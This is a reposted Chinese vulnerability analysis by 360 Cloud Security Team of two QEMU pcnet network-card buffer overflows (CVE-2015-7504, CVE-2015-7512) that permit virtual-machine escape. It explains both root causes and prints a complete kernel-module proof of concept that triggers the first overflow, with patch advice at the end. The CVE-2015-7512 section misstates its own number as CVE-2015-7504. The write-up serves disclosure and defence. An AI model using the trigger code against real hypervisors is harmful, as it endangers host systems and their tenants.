# QEMU新虚拟机逃逸漏洞深入分析

阅读量 **214870**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2015-11-30 17:12:33

 **x**

##### 译文声明

本文是翻译文章，文章来源：360云安全团队

译文仅供参考，具体内容表达以及含义原文为准。

**author：360云安全团队**  

摘要

11月30日14时,QEMU官方公开了两个由奇虎360云安全团队安全研究员–刘令(Ling
Liu)独立发现并报告的缓冲区溢出漏洞,通用漏洞编号分别为CVE-2015-7504和CVE-2015-7512,两个漏洞均存在于QEMU所虚拟实现的AMD
PC-Net II网卡组件。两个漏洞经过QEMU官方安全团队评估后确认可以造成“宿主机任意执行代码”。

目前已经确认360安全云( https://cloud.360.cn )不受漏洞影响。

北京时间2015年11月30日14时,QEMU官方公开了两个由奇虎360云安全团队安全研究员–刘令(Ling
Liu)独立发现并报告的缓冲区溢出漏洞,通用漏洞编号分别为CVE-2015-7504和CVE-2015-7512,两个漏洞均存在于QEMU所虚拟实现的AMD
PC-Net II网卡组件。两个漏洞经过QEMU官方安全团队评估后确认可以造成“宿主机任意执行代码”。

目前已经确认360安全云( [https://cloud.360.cn](https://cloud.360.cn/))不受漏洞影响。

QEMU是由法布里斯·贝拉(Fabrice
Bellard)所编写的以GPL许可证分发源码的模拟处理器。它可以模拟多款不同架构的CPU,还包含部分硬件模拟,包括软驱、显卡、并口、串口、声卡、网卡等,以提供基本的操作系统运行所需环境。其中QEMU所模拟的网卡种类较多,包括pcnet、ne2000、rtl8139、e1000等。

本次公开的两个漏洞就存在于模拟pcnet网卡设备的代码中(源码路径:hw/net/pcnet.c)。受这两个漏洞影响的软件/项目包括使用pcnet组件的QEMU、Xen、QEMU-KVM等。

**CVE-2015-7504 漏洞分析**

**简介**

今年10月,360云安全团队安全研究员–刘令(Ling
Liu)向QEMU的安全团队提交了pcnet网卡模拟组件中的一个缓冲区溢出漏洞,经过确认后漏洞编号为CVE-2015-7504。该漏洞具备如下特性:

1\. 该漏洞可通过虚拟机发包直接触发,攻击构造条件难度中等

2\. 利用该漏洞可以直接控制CPU的指令指针寄存器(Intel
X86体系为EIP或RIP),在未开启地址随机功能的宿主机系统上可以执行任意代码(即“虚拟机逃逸”)

3\. 配合特定反随机化技巧/漏洞攻击者可以在开启地址随机化保护功能的宿主操作系统上实现任意代码执行

**分析**

漏洞发生在pcnet网卡使用loopback/looptest模式接收数据时,会在接收到的数据尾部增加一个CRC校验码(长度4个字节),当发送包的大小刚好符合接收包设定的最大缓冲区大小(4096字节)时。在intel
X86-64体系下附加的CRC校验码会覆盖掉所在的PCNetStae_st结构体后面的中断处理指针irq中的后4个字节,攻击者可以构造特定的CRC校验码来实现进一步的攻击利用。

实际的漏洞数据大流程在pcnet的传输处理函数pcnet_transmit()中,该函数会从物理内存中载入将要发送的数据包的描述信息到一个被命名为tmd的结构体中(struct
pcnet_TMD),

再按照tmd.length的长度从物理内存中载入将要发送的数据包到PCNetStae_st结构体的buffer[4096]中。

pcnet中虚拟机发送的数据包的长度bcnt最大值为4096,刚好与buffer的大小一致。

通常情况下,发送4096字节长度的数据包不会发生溢出,但是pcnet支持looptest模式。当网卡中的CSR_LOOP被置位于looptest模式时,pcnet_transmit会调用pcnet_receive把要发送的数据包当作网卡接收到的数据包进行处理。

当网卡处于looptest模式时,pcnet_receive()函数会计算所收到的数据包的CRC值,并把CRC附加在数据包的后面,当数据包的长度为4096时,附加的4字节CRC值便会写在buffer[4096]的外面,产生了缓冲区溢出。

溢出的4字节则会覆盖掉IRQState结构的指针,指向虚假的IRQState结构,

在下一次qemu_set_irq()被调用时,便可控制EIP/RIP,改变程序的执行流程。

攻击内存布局大致如下:

**漏洞演示**

在虚拟机中编译PoC并加载内核模块,gdb中可看到s->irq被修改,这会导致执行流程的改变,可以成功控制s->irq->handler函数指针。

    
    
    //
    // PoC CVE-2015-7504
    // written by LingLiu of Qihoo360 Cloud Security Team
    //
    #include
    #include
    #include
    #define PCNET           0xc000
    struct pcnet_TMD{
            unsigned int tbadr;
            signed short length;
            signed short status;
            unsigned int misc;
            unsigned int res;
    };
    struct pcnet_initblk32{
            unsigned short mode;
            unsigned char rlen;
            unsigned char tlen;
            unsigned short padr[3];
            unsigned short _res;
            unsigned short ladrf[4];
            unsigned int rdra;
            unsigned int tdra;
    };
    void write_rap(unsigned int val)
    {
            outl(val,0x14+PCNET);
    }
    void write_csr(unsigned int idx,unsigned int val)
    {
            write_rap(idx);
            outl(val,0x10+PCNET);
    }
    unsigned int read_csr(unsigned int idx)
    {
            write_rap(idx);
            return inl(0x10+PCNET);
    }
    void write_bcr(unsigned int idx,unsigned int val)
    {
            write_rap(idx);
            outl(val,0x1c+PCNET);
    }
    unsigned int read_bcr(unsigned int idx)
    {
            write_rap(idx);
            return inl(0x1c+PCNET);
    }
    void looptest_overflow(void)
    {
            unsigned char *vpacket;
            unsigned char *ppacket;
            unsigned char *vtmd;
            unsigned char *ptmd;
            unsigned char *vinitblk;
            unsigned char *pinitblk;
            struct pcnet_TMD *tmd;
            struct pcnet_initblk32 *initblk;
            unsigned int oldval;
            vpacket=(unsigned char *)kmalloc(4096,0);
            memset(vpacket,0xdd,4096);
            ppacket=(unsigned char *)virt_to_phys(vpacket);
            vtmd=(unsigned char *)kmalloc(sizeof(struct pcnet_TMD),0);
            ptmd=(unsigned char *)virt_to_phys(vtmd);
            vinitblk=(unsigned char *)kmalloc(sizeof(struct pcnet_initblk32),0);
            pinitblk=(unsigned char *)virt_to_phys(vinitblk);
            memset(vinitblk,0x0,sizeof(struct pcnet_initblk32));
            initblk=(struct pcnet_initblk32*)vinitblk;
            initblk->tlen=0;
            initblk->tdra=(unsigned int)ptmd;
            initblk->rdra=(unsigned int)ptmd;//just enable recv
            //pcnet_s_reset()
            inw(0x14+PCNET);
            //set CSR_SPND
            oldval=read_csr(5);
            write_csr(5,oldval|0x1);
            //set CSR_IADR
            write_csr(1,(unsigned int)pinitblk&0xffff);
            write_csr(2,(unsigned int)pinitblk>>16);
            //pcnet_init()
            write_csr(0,0x1);
            //set CSR_XMTRL=1
            write_csr(0,0x4);
            write_csr(78,0x1);
            //set CSR_LOOP
            oldval=read_csr(15);
            write_csr(15,oldval|0x4);
            oldval=read_csr(15);
            //set CSR_PROM
            oldval=read_csr(15);
            write_csr(15,oldval|0x8000);
            //set BCR_SWSTYLE=1
            oldval=read_bcr(20);
            write_bcr(20,1+(oldval&~0xff));
            //clear CSR_SPND
            oldval=read_csr(5);
            write_csr(5,oldval&~0x1);
            //pcnet_start()
            write_csr(0,0x2);
            tmd=(struct pcnet_TMD*)vtmd;
            tmd->tbadr=(unsigned int)ppacket;
            tmd->length=0xf000;//packet length = 4096
            tmd->status=0x8300;
            tmd->misc=0x0;
            tmd->res=0x0;
            //pcnet_transmit()
            write_csr(0,0x8);
    }
    int init_module(void)
    {
            looptest_overflow();
            return 0;
    }
    void cleanup_module(void)
    {
    }

实际的攻击视频:

**  
**

**CVE-2015-7512**

**简介**

今年9月,360云安全团队安全研究员–刘令(Ling
Liu)向QEMU的安全团队提交了pcnet网卡模拟组件中的一个缓冲区溢出漏洞,经过确认后漏洞编号为CVE-2015-7504。该漏洞具备如下特性:

1\. 该漏洞在虚拟机收到数据包时直接触发,攻击构造条件难度中低

2\. 虚拟机所处环境需确保pcnet网卡能够接收到QEMU传递过来的大于4096长度的数据包。

3\. 利用该漏洞可以直接控制CPU的指令指针寄存器(Intel
X86体系为EIP或RIP),在未开启地址随机功能的宿主机系统上可以执行任意代码(即“虚拟机逃逸”)

4\. 配合特定反随机化技巧/漏洞攻击者可以在开启地址随机化保护功能的宿主操作系统上实现任意代码执行

**分析**

在配置了pcnet网卡的虚拟机启动时,pcnet_common_init会将pcnet_receive注册为该网卡收到数据包时的处理函数。当网卡收到数据包时,qemu_deliver_packet()会调用pcnet_receive,并传入数据包所在地址和大小。在网卡不为looptest模式时,pcnet_receive直接将数据包复制到PCNetState结构体的buffer[4096]中。

然而当网卡收到的数据包的长度大于4096时,超出的数据便会覆盖PCNetState结构中的irq、phys_mem_read、dma_opaque等。

攻击内存布局大致如下:

**触发途径**

由于系统中MTU的限制,通常的数据包长度不会达到4096以上。那么至少在以下两种情况下可以触发此漏洞:

配置pcnet的guest使用tap方式启动,该tap在host端的MTU要大于4096,则可由host发送大数据包即可触发漏洞。

guest启动时配有pcnet、e1000双网卡且处于同一vlan中,guest中e1000网卡的MTU要大于4096,则在guest中,通过e1000发送大数据包即可触发漏洞。

**漏洞演示**

启动qemu时pcnet为tap方式,配置IP使host与guest处于同一网段。在host端通过该tap发送raw
packet给pcnet网卡。gdb中显示s->irq、s->phys_mem_write等值被覆盖,当s->phys_mem_write被使用时,便可控制RIP,改变程序的执行流程。

**PoC**

发送raw
packet可使用[https://gist.github.com/austinmarton/1922600](https://gist.github.com/austinmarton/1922600)

实际的攻击视频:

**漏洞防护方案**

QEMU官方已经针对受以上两个漏洞影响的版本给出了补丁,请使用pcnet模块的QEMU-KVM或Xen平台用户,尽快选择对应的补丁进行安全升级。

[http://xenbits.xen.org/xsa/](http://xenbits.xen.org/xsa/)

[http://wiki.qemu.org/Main_Page](http://wiki.qemu.org/Main_Page)

目前确认360云不受此次漏洞影响。

  

**技术参考**

1\. <https://gist.github.com/austinmarton/1922600>

2\. [https://code.google.com/p/google-security-research/issues/detail?id=395](https://code.google.com/p/google-security-research/issues/detail?id=395)

  

**关于360云**

360云成立于2014年12月31日,以“让企业安全用云”为使命,致力成为企业首选的安全云平台服务提供商。

360云将聚焦提供安全的云计算服务,凝聚资源隔离、数据加密、安全加固等数十种安全防护手段,打造行业第一安全云。

360云结合自身业务,发挥其在互联网领域的技术优势,为用户提供公有云、私有云服务,以及游戏云、视频直播云、智能云等行业解决方案。

本文翻译自360云安全团队 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360安全卫士** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/83015](/post/id/83015)

安全客 - 有思想的安全新媒体

本文转载自: [360云安全团队]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t01cc856584b7ed76c0.jpg) 360安全卫士

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

